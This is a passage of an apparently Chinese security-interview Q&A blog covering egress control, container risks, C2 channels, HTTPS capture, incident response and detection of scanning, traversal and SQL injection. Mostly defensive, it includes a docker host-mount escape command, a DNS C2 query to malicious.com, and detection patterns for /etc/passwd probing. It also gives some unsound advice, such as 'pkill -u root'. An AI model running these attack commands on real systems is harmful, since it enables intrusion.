class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/nginx/cert.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/key.pem;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> https://backend.server.com;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="如何通过技术手段避免非预期端口开放？"><a href="#如何通过技术手段避免非预期端口开放？" class="headerlink" title="如何通过技术手段避免非预期端口开放？"></a><strong>如何通过技术手段避免非预期端口开放？</strong></h3><h2 id="方法：1-使用防火墙：-2-端口监听监测：-3-应用层访问控制：-配置-Nginx-仅允许特定-IP-访问："><a href="#方法：1-使用防火墙：-2-端口监听监测：-3-应用层访问控制：-配置-Nginx-仅允许特定-IP-访问：" class="headerlink" title="方法：1. 使用防火墙：   2. 端口监听监测：   3. 应用层访问控制：   - 配置 Nginx 仅允许特定 IP 访问：     "></a><strong>方法</strong>：<br>1. <strong>使用防火墙</strong>：<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 3306 -j DROP</span><br></pre></td></tr></table></figure><br>2. <strong>端口监听监测</strong>：<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp | grep LISTEN</span><br></pre></td></tr></table></figure><br>3. <strong>应用层访问控制</strong>：<br>   - 配置 <strong>Nginx 仅允许特定 IP 访问</strong>：<br>     <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">allow</span> <span class="number">192.168.1.100</span>;</span><br><span class="line"><span class="attribute">deny</span> all;</span><br></pre></td></tr></table></figure></h2><h3 id="容器存在哪些特有安全风险？"><a href="#容器存在哪些特有安全风险？" class="headerlink" title="容器存在哪些特有安全风险？"></a><strong>容器存在哪些特有安全风险？</strong></h3><ol>
<li><strong>容器逃逸</strong>：<ul>
<li>通过 <code>docker.sock</code> 访问宿主机：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/host ubuntu <span class="built_in">chroot</span> /host</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>镜像供应链攻击</strong>：<ul>
<li>恶意镜像可能包含后门。</li>
</ul>
</li>
</ol>
<h2 id="防护措施：-限制容器权限：-使用可信镜像来源。"><a href="#防护措施：-限制容器权限：-使用可信镜像来源。" class="headerlink" title="防护措施：- 限制容器权限：  - 使用可信镜像来源。"></a><strong>防护措施</strong>：<br>- 限制容器权限：<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --cap-drop=ALL</span><br></pre></td></tr></table></figure><br>- 使用可信镜像来源。</h2><h3 id="运维自屏化的难点是什么？"><a href="#运维自屏化的难点是什么？" class="headerlink" title="运维自屏化的难点是什么？"></a><strong>运维自屏化的难点是什么？</strong></h3><ol>
<li><strong>自动化程度要求高</strong>：<ul>
<li>需要 DevOps&#x2F;CI&#x2F;CD 深度集成。</li>
</ul>
</li>
<li><strong>安全策略同步</strong>：<ul>
<li>防火墙、身份验证策略需一致。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="不同语言对于系统-CA-证书的信任情况有何不同？如何让各语言信任系统-CA-证书？"><a href="#不同语言对于系统-CA-证书的信任情况有何不同？如何让各语言信任系统-CA-证书？" class="headerlink" title="不同语言对于系统 CA 证书的信任情况有何不同？如何让各语言信任系统 CA 证书？"></a><strong>不同语言对于系统 CA 证书的信任情况有何不同？如何让各语言信任系统 CA 证书？</strong></h3><table>
<thead>
<tr>
<th><strong>语言</strong></th>
<th><strong>默认 CA 证书策略</strong></th>
<th><strong>信任系统 CA 证书方式</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Java</strong></td>
<td>使用 JDK 内置 CA</td>
<td><code>keytool -importkeystore</code></td>
</tr>
<tr>
<td><strong>Python</strong></td>
<td>使用 <code>certifi</code></td>
<td><code>export CURL_CA_BUNDLE</code></td>
</tr>
<tr>
<td><strong>Node.js</strong></td>
<td>默认不信任</td>
<td><code>export NODE_EXTRA_CA_CERTS</code></td>
</tr>
</tbody></table>
<hr>
<h3 id="简单描述有哪几种方式实现服务器截外联，各自利弊是什么？"><a href="#简单描述有哪几种方式实现服务器截外联，各自利弊是什么？" class="headerlink" title="简单描述有哪几种方式实现服务器截外联，各自利弊是什么？"></a><strong>简单描述有哪几种方式实现服务器截外联，各自利弊是什么？</strong></h3><ol>
<li><p><strong>防火墙规则</strong>（最常用）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp -j REJECT</span><br></pre></td></tr></table></figure>
<p><strong>优点</strong>：高效、直接。<br><strong>缺点</strong>：误操作可能影响正常业务。</p>
</li>
<li><p><strong>代理服务器</strong>（透明代理）</p>
<ul>
<li>通过 <strong>Squid、Shadowsocks</strong> 控制流量：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://proxy.server:3128&quot;</span></span><br></pre></td></tr></table></figure>
<strong>优点</strong>：可审计流量。<br><strong>缺点</strong>：额外维护成本。</li>
</ul>
</li>
<li><p><strong>DNS 解析控制</strong></p>
<ul>
<li>仅允许可信域名解析：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;127.0.0.1 malicious.com&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<strong>优点</strong>：防止恶意 C2 通信。<br><strong>缺点</strong>：不适用于 IP 直连流量。</li>
</ul>
</li>
<li><p><strong>SOCKS5 隧道</strong></p>
<ul>
<li>通过 <strong>SSH 隧道</strong> 控制网络流量：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 user@proxy-server</span><br></pre></td></tr></table></figure>
<strong>优点</strong>：可用于加密通信。<br><strong>缺点</strong>：需要 SOCKS5 代理支持。</li>
</ul>
</li>
</ol>
<h2 id="威胁应对岗"><a href="#威胁应对岗" class="headerlink" title="威胁应对岗"></a>威胁应对岗</h2><h3 id="如何衡量威胁感知能力强弱？"><a href="#如何衡量威胁感知能力强弱？" class="headerlink" title="如何衡量威胁感知能力强弱？"></a><strong>如何衡量威胁感知能力强弱？</strong></h3><p><strong>衡量指标</strong>：</p>
<ol>
<li><strong>检测覆盖率</strong>：<ul>
<li>能否覆盖 <strong>网络、应用、终端、日志</strong> 多个层面。</li>
</ul>
</li>
<li><strong>误报率&#x2F;漏报率</strong>：<ul>
<li>误报过多会影响运维，漏报则可能导致攻击未被发现。</li>
</ul>
</li>
<li><strong>实时性</strong>：<ul>
<li>是否能够 <strong>实时分析、秒级响应</strong>。</li>
</ul>
</li>
</ol>
<p><strong>提升方法</strong>：</p>
<ul>
<li>结合 <strong>AI 机器学习</strong> 提升威胁检测精准度。</li>
<li>采用 <strong>关联分析（SIEM）</strong>，分析不同日志来源的数据。</li>
</ul>
<hr>
<h3 id="感知规则的有效性如何系统验证？"><a href="#感知规则的有效性如何系统验证？" class="headerlink" title="感知规则的有效性如何系统验证？"></a><strong>感知规则的有效性如何系统验证？</strong></h3><h2 id="验证方法：1-攻击模拟测试：-使用-Kali-Linux、Metasploit-模拟攻击场景，测试规则是否生效。2-历史攻击回放：-通过-日志重放-复现真实攻击流量，验证拦截效果：-3-对抗样本测试：-生成变种攻击-payload，测试-WAF-规避能力。"><a href="#验证方法：1-攻击模拟测试：-使用-Kali-Linux、Metasploit-模拟攻击场景，测试规则是否生效。2-历史攻击回放：-通过-日志重放-复现真实攻击流量，验证拦截效果：-3-对抗样本测试：-生成变种攻击-payload，测试-WAF-规避能力。" class="headerlink" title="验证方法：1. 攻击模拟测试：   - 使用 Kali Linux、Metasploit 模拟攻击场景，测试规则是否生效。2. 历史攻击回放：   - 通过 日志重放 复现真实攻击流量，验证拦截效果：     3. 对抗样本测试：   - 生成变种攻击 payload，测试 WAF 规避能力。"></a><strong>验证方法</strong>：<br>1. <strong>攻击模拟测试</strong>：<br>   - 使用 <strong>Kali Linux</strong>、<strong>Metasploit</strong> 模拟攻击场景，测试规则是否生效。<br>2. <strong>历史攻击回放</strong>：<br>   - 通过 <strong>日志重放</strong> 复现真实攻击流量，验证拦截效果：<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpreplay -i eth0 attack_traffic.pcap</span><br></pre></td></tr></table></figure><br>3. <strong>对抗样本测试</strong>：<br>   - 生成变种攻击 payload，测试 WAF 规避能力。</h2><h3 id="未知部分如何衡量？"><a href="#未知部分如何衡量？" class="headerlink" title="未知部分如何衡量？"></a><strong>未知部分如何衡量？</strong></h3><h2 id="未知威胁的衡量方法：1-基线偏离检测：-记录-正常流量模式，发现异常行为：-2-行为分析：-采用-UEBA（用户实体行为分析），检测异常行为模式。3-蜜罐技术：-部署-Honeypot-诱捕攻击者，分析未知攻击方式。"><a href="#未知威胁的衡量方法：1-基线偏离检测：-记录-正常流量模式，发现异常行为：-2-行为分析：-采用-UEBA（用户实体行为分析），检测异常行为模式。3-蜜罐技术：-部署-Honeypot-诱捕攻击者，分析未知攻击方式。" class="headerlink" title="未知威胁的衡量方法：1. 基线偏离检测：   - 记录 正常流量模式，发现异常行为：     2. 行为分析：   - 采用 UEBA（用户实体行为分析），检测异常行为模式。3. 蜜罐技术：   - 部署 Honeypot 诱捕攻击者，分析未知攻击方式。"></a><strong>未知威胁的衡量方法</strong>：<br>1. <strong>基线偏离检测</strong>：<br>   - 记录 <strong>正常流量模式</strong>，发现异常行为：<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_csv(<span class="string">&quot;traffic_logs.csv&quot;</span>)</span><br><span class="line">df.describe()</span><br></pre></td></tr></table></figure><br>2. <strong>行为分析</strong>：<br>   - 采用 <strong>UEBA（用户实体行为分析）</strong>，检测异常行为模式。<br>3. <strong>蜜罐技术</strong>：<br>   - 部署 <strong>Honeypot</strong> 诱捕攻击者，分析未知攻击方式。</h2><h2 id="流量采集与清洗"><a href="#流量采集与清洗" class="headerlink" title="流量采集与清洗"></a><strong>流量采集与清洗</strong></h2><h3 id="威胁感知可以在哪些层面进行？"><a href="#威胁感知可以在哪些层面进行？" class="headerlink" title="威胁感知可以在哪些层面进行？"></a><strong>威胁感知可以在哪些层面进行？</strong></h3><h2 id="不同层面的威胁感知：1-网络层：-监测-异常端口扫描、DDoS-攻击。2-应用层：-发现-SQL-注入、XSS、业务滥用。3-终端层：-监测-恶意软件、C2-连接。4-用户行为层：-通过-UEBA-检测账号盗用、异常访问。"><a href="#不同层面的威胁感知：1-网络层：-监测-异常端口扫描、DDoS-攻击。2-应用层：-发现-SQL-注入、XSS、业务滥用。3-终端层：-监测-恶意软件、C2-连接。4-用户行为层：-通过-UEBA-检测账号盗用、异常访问。" class="headerlink" title="不同层面的威胁感知：1. 网络层：   - 监测 异常端口扫描、DDoS 攻击。2. 应用层：   - 发现 SQL 注入、XSS、业务滥用。3. 终端层：   - 监测 恶意软件、C2 连接。4. 用户行为层：   - 通过 UEBA 检测账号盗用、异常访问。"></a><strong>不同层面的威胁感知</strong>：<br>1. <strong>网络层</strong>：<br>   - 监测 <strong>异常端口扫描、DDoS 攻击</strong>。<br>2. <strong>应用层</strong>：<br>   - 发现 <strong>SQL 注入、XSS、业务滥用</strong>。<br>3. <strong>终端层</strong>：<br>   - 监测 <strong>恶意软件、C2 连接</strong>。<br>4. <strong>用户行为层</strong>：<br>   - 通过 <strong>UEBA</strong> 检测账号盗用、异常访问。</h2><h3 id="TCP-协议的流量要存储哪些关键字段？"><a href="#TCP-协议的流量要存储哪些关键字段？" class="headerlink" title="TCP 协议的流量要存储哪些关键字段？"></a><strong>TCP 协议的流量要存储哪些关键字段？</strong></h3><h2 id="关键字段：1-源-IP-目标-IP：-识别攻击来源。2-源端口-目标端口：-确定服务类型（如-80-为-HTTP）。3-数据包序列号（SEQ）：-用于检测-TCP-重传、流量重放。4-流量方向（IN-OUT）：-便于区分出站-入站流量。"><a href="#关键字段：1-源-IP-目标-IP：-识别攻击来源。2-源端口-目标端口：-确定服务类型（如-80-为-HTTP）。3-数据包序列号（SEQ）：-用于检测-TCP-重传、流量重放。4-流量方向（IN-OUT）：-便于区分出站-入站流量。" class="headerlink" title="关键字段：1. 源 IP&#x2F;目标 IP：   - 识别攻击来源。2. 源端口&#x2F;目标端口：   - 确定服务类型（如 80 为 HTTP）。3. 数据包序列号（SEQ）：   - 用于检测 TCP 重传、流量重放。4. 流量方向（IN&#x2F;OUT）：   - 便于区分出站&#x2F;入站流量。"></a><strong>关键字段</strong>：<br>1. <strong>源 IP&#x2F;目标 IP</strong>：<br>   - 识别攻击来源。<br>2. <strong>源端口&#x2F;目标端口</strong>：<br>   - 确定服务类型（如 80 为 HTTP）。<br>3. <strong>数据包序列号（SEQ）</strong>：<br>   - 用于检测 TCP 重传、流量重放。<br>4. <strong>流量方向（IN&#x2F;OUT）</strong>：<br>   - 便于区分出站&#x2F;入站流量。</h2><h3 id="如何在服务器上抓取-HTTPS-流量进行分析？"><a href="#如何在服务器上抓取-HTTPS-流量进行分析？" class="headerlink" title="如何在服务器上抓取 HTTPS 流量进行分析？"></a><strong>如何在服务器上抓取 HTTPS 流量进行分析？</strong></h3><p><strong>方法 1：使用 <code>tcpdump</code> 抓包</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 port 443 -w https_traffic.pcap</span><br></pre></td></tr></table></figure>

<p><strong>方法 2：使用 Wireshark 解密 HTTPS</strong></p>
<ol>
<li>在浏览器设置 <code>SSLKEYLOGFILE</code> 环境变量：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SSLKEYLOGFILE=/tmp/sslkeys.log</span><br></pre></td></tr></table></figure></li>
<li>在 Wireshark 加载 <code>sslkeys.log</code> 进行流量解密。</li>
</ol>
<h2 id="方法-3：使用-mitmproxy-进行-HTTPS-代理"><a href="#方法-3：使用-mitmproxy-进行-HTTPS-代理" class="headerlink" title="方法 3：使用 mitmproxy 进行 HTTPS 代理"></a><strong>方法 3：使用 mitmproxy 进行 HTTPS 代理</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy -p 8080 --mode transparent</span><br></pre></td></tr></table></figure></h2><h3 id="常见的-C-C-通道种类和特征？"><a href="#常见的-C-C-通道种类和特征？" class="headerlink" title="常见的 C&amp;C 通道种类和特征？"></a><strong>常见的 C&amp;C 通道种类和特征？</strong></h3><p><strong>常见 C&amp;C（Command &amp; Control）通道类型</strong>：</p>
<ol>
<li><strong>基于 HTTP&#x2F;HTTPS</strong>：<ul>
<li>伪装成正常 Web 流量，C2 服务器隐藏在 CDN 之后。</li>
</ul>
</li>
<li><strong>基于 DNS</strong>：<ul>
<li>通过 DNS 解析数据，如 <code>base64</code> 编码数据存储在 TXT 记录中：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @malicious.com TXT</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>基于 P2P</strong>：<ul>
<li>无需中心化服务器，如 Botnet 网络。</li>
</ul>
</li>
<li><strong>基于社交媒体</strong>：<ul>
<li>通过 Telegram、Twitter 传输命令。</li>
</ul>
</li>
</ol>
<p><strong>特征分析</strong>：</p>
<ul>
<li><strong>上行流量比下行流量大</strong>（Bot 设备发送大量数据）。</li>
<li><strong>长连接保持</strong>，会话时间较长。</li>
<li><strong>请求心跳机制</strong>，周期性访问 C2 服务器。</li>
<li><strong>异常资源引用</strong>，无 JS&#x2F;CSS 但频繁访问 URL。</li>
</ul>
<hr>
<h3 id="如何在加密流量中检测出恶意流量？"><a href="#如何在加密流量中检测出恶意流量？" class="headerlink" title="如何在加密流量中检测出恶意流量？"></a><strong>如何在加密流量中检测出恶意流量？</strong></h3><p><strong>检测方法</strong>：</p>
<ol>
<li><strong>流量模式分析</strong>：<ul>
<li>识别异常长连接、周期性数据包特征。</li>
</ul>
</li>
<li><strong>JA3 指纹识别</strong>（TLS 指纹）：<ul>
<li>通过 <code>JA3</code> 指纹匹配 C2 服务器行为：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ja3 -r capture.pcap</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>SNI 分析</strong>：<ul>
<li>检查 SNI 是否访问异常域名，如：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep SNI /var/log/ssl_access.log</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何识别异常服务器外联？"><a href="#如何识别异常服务器外联？" class="headerlink" title="如何识别异常服务器外联？"></a><strong>如何识别异常服务器外联？</strong></h3><p><strong>异常外联行为</strong>：</p>
<ol>
<li><strong>短时间内连接多个可疑 IP</strong>：<ul>
<li><code>netstat -an</code> 发现大量出站连接。</li>
</ul>
</li>
<li><strong>访问冷门域名</strong>：<ul>
<li>通过 <code>dnsmasq.log</code> 发现非常见域名解析：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;QUERY&quot;</span> /var/log/dnsmasq.log</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>加密流量异常增多</strong>：<ul>
<li><code>tcpdump</code> 抓包分析 TLS 连接数量激增：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 port 443</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h3 id="基于网络五元组可以做哪些风险行为的分析？"><a href="#基于网络五元组可以做哪些风险行为的分析？" class="headerlink" title="基于网络五元组可以做哪些风险行为的分析？"></a><strong>基于网络五元组可以做哪些风险行为的分析？</strong></h3><p><strong>五元组（源 IP、目的 IP、源端口、目的端口、协议）分析风险</strong>：</p>
<ol>
<li><strong>端口扫描检测</strong>：<ul>
<li>同一 IP 短时间访问多个端口：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;SYN&quot;</span> /var/log/firewall.log</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>流量突变</strong>：<ul>
<li>发现异常上传流量（如数据泄露）。</li>
</ul>
</li>
<li><strong>协议异常</strong>：<ul>
<li>HTTP 端口传输非 HTTP 数据，可能是隧道通信。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="风险识别与应对-主机侧"><a href="#风险识别与应对-主机侧" class="headerlink" title="风险识别与应对 - 主机侧"></a><strong>风险识别与应对 - 主机侧</strong></h2><h3 id="主机有那些日志对风险识别有帮助？"><a href="#主机有那些日志对风险识别有帮助？" class="headerlink" title="主机有那些日志对风险识别有帮助？"></a><strong>主机有那些日志对风险识别有帮助？</strong></h3><p><strong>关键日志</strong>：</p>
<ol>
<li>**<code>/var/log/auth.log</code>**：<ul>
<li>记录 SSH 登录，发现暴力破解攻击。</li>
</ul>
</li>
<li>**<code>/var/log/syslog</code>**：<ul>
<li>记录系统异常事件，如 root 权限提权。</li>
</ul>
</li>
<li>**<code>/var/log/secure</code>**：<ul>
<li>记录 sudo 操作，判断是否有非授权提权行为。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="抽象来看主机中有哪些日志可实现方式？"><a href="#抽象来看主机中有哪些日志可实现方式？" class="headerlink" title="抽象来看主机中有哪些日志可实现方式？"></a><strong>抽象来看主机中有哪些日志可实现方式？</strong></h3><p><strong>日志类型</strong>：</p>
<ol>
<li><strong>安全审计日志</strong>：<ul>
<li>记录用户登录、权限变更（如 <code>auth.log</code>）。</li>
</ul>
</li>
<li><strong>系统事件日志</strong>：<ul>
<li>进程启动&#x2F;终止（<code>dmesg</code>）。</li>
</ul>
</li>
<li><strong>网络连接日志</strong>：<ul>
<li>记录出站&#x2F;入站流量（<code>iptables log</code>）。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="一个黑客入侵主机后植入了一个木马，并擦除了各种日志，如何找出其如何入侵的以及入侵后做了什么？"><a href="#一个黑客入侵主机后植入了一个木马，并擦除了各种日志，如何找出其如何入侵的以及入侵后做了什么？" class="headerlink" title="一个黑客入侵主机后植入了一个木马，并擦除了各种日志，如何找出其如何入侵的以及入侵后做了什么？"></a><strong>一个黑客入侵主机后植入了一个木马，并擦除了各种日志，如何找出其如何入侵的以及入侵后做了什么？</strong></h3><p><strong>溯源方法</strong>：</p>
<ol>
<li>**检查 <code>.bash_history</code>**：<ul>
<li>可能留下命令痕迹：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.bash_history</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>查看 <code>/proc</code> 进程信息</strong>：<ul>
<li>运行 <code>ps aux</code>，查找隐藏进程：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep suspicious</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>恢复日志</strong>：<ul>
<li>使用 <code>extundelete</code> 尝试恢复被删除的日志：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extundelete /dev/sda1 --restore-all</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>检查文件变更时间</strong>：<ul>
<li>通过 <code>ls -lt</code> 确认最近修改的可疑文件。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="某个黑客入侵主机后，拿到了-root-权限，如何止血？"><a href="#某个黑客入侵主机后，拿到了-root-权限，如何止血？" class="headerlink" title="某个黑客入侵主机后，拿到了 root 权限，如何止血？"></a><strong>某个黑客入侵主机后，拿到了 root 权限，如何止血？</strong></h3><p><strong>紧急止血方案</strong>：</p>
<ol>
<li><strong>限制 root 访问</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd -l root</span><br></pre></td></tr></table></figure></li>
<li><strong>强制踢除攻击者会话</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill -u root</span><br></pre></td></tr></table></figure></li>
<li><strong>关闭网络访问</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 down</span><br></pre></td></tr></table></figure></li>
<li><strong>恢复安全策略</strong>：<ul>
<li>重新部署 <code>iptables</code> 规则。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="感知到黑客入侵了所有服务器，怎么办？"><a href="#感知到黑客入侵了所有服务器，怎么办？" class="headerlink" title="感知到黑客入侵了所有服务器，怎么办？"></a><strong>感知到黑客入侵了所有服务器，怎么办？</strong></h3><p><strong>紧急响应步骤</strong>：</p>
<ol>
<li><strong>隔离受感染服务器</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s attacker_ip -j DROP</span><br></pre></td></tr></table></figure></li>
<li><strong>分析恶意软件</strong>：<ul>
<li>提取恶意进程的 <code>hash</code> 进行溯源：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sha256sum</span> /tmp/malware</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>重置所有凭据</strong>：<ul>
<li>重新生成 <code>SSH</code> 密钥，并修改 root 密码：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f /root/.ssh/id_rsa -N <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>检查持久化后门</strong>：<ul>
<li>检查 <code>crontab</code> 是否被篡改：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>全网威胁狩猎</strong>：<ul>
<li>扫描所有服务器，查找相同恶意进程：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep malware</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h3 id="如何准确识别域名探测？"><a href="#如何准确识别域名探测？" class="headerlink" title="如何准确识别域名探测？"></a><strong>如何准确识别域名探测？</strong></h3><p><strong>探测特征</strong>：</p>
<ul>
<li>解析大量不存在的子域：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep NXDOMAIN /var/log/dnsmasq.log</span><br></pre></td></tr></table></figure></li>
<li>访问特定安全机制，如 <code>.well-known/security.txt</code>。</li>
</ul>
<p><strong>防御方法</strong>：</p>
<ul>
<li>启用 <strong>DNS 速率限制</strong>，防止大规模子域枚举：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p udp --dport 53 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 10/s -j ACCEPT</span><br></pre></td></tr></table></figure></li>
<li>监控 DNS 查询日志，发现异常域名解析行为。</li>
</ul>
<hr>
<h3 id="如何准确识别端口探测？"><a href="#如何准确识别端口探测？" class="headerlink" title="如何准确识别端口探测？"></a><strong>如何准确识别端口探测？</strong></h3><p><strong>端口探测特征</strong>：</p>
<ol>
<li><strong>单个 IP 访问多个端口</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;SYN&quot;</span> /var/log/firewall.log | awk <span class="string">&#x27;&#123;print $5&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br></pre></td></tr></table></figure></li>
<li><strong>异常速率</strong>：<ul>
<li>短时间内出现大量 <code>SYN</code> 请求。</li>
</ul>
</li>
</ol>
<p><strong>防御方法</strong>：</p>
<ul>
<li>配置 <code>iptables</code> 限制扫描行为：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --syn -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 5/s -j ACCEPT</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="如何准确识别文件遍历探测？"><a href="#如何准确识别文件遍历探测？" class="headerlink" title="如何准确识别文件遍历探测？"></a><strong>如何准确识别文件遍历探测？</strong></h3><p><strong>常见特征</strong>：</p>
<ul>
<li>访问 <code>/etc/passwd</code>、<code>/proc/self/environ</code> 等敏感文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;passwd&quot;</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure></li>
<li>URL 结尾包含 <code>../</code>、<code>..%2f</code>（路径遍历编码）。</li>
</ul>
<p><strong>防御措施</strong>：</p>
<ul>
<li>在 <code>Nginx</code> 配置禁止目录遍历：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ &quot;\.\.&quot;</span> &#123;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="SQL-注入拦截规则如何实现？"><a href="#SQL-注入拦截规则如何实现？" class="headerlink" title="SQL 注入拦截规则如何实现？"></a><strong>SQL 注入拦截规则如何实现？</strong></h3><p><strong>常见 SQL 注入特征</strong>：</p>
<ul>
<li>发现 <code>UNION SELECT</code>、<code>ORDER BY</code> 关键词。</li>
<li>URL 包含 <code>--</code>、<code>#</code>（SQL 注释）。</li>
</ul>
<p><strong>拦截方式</strong>：</p>
<ul>
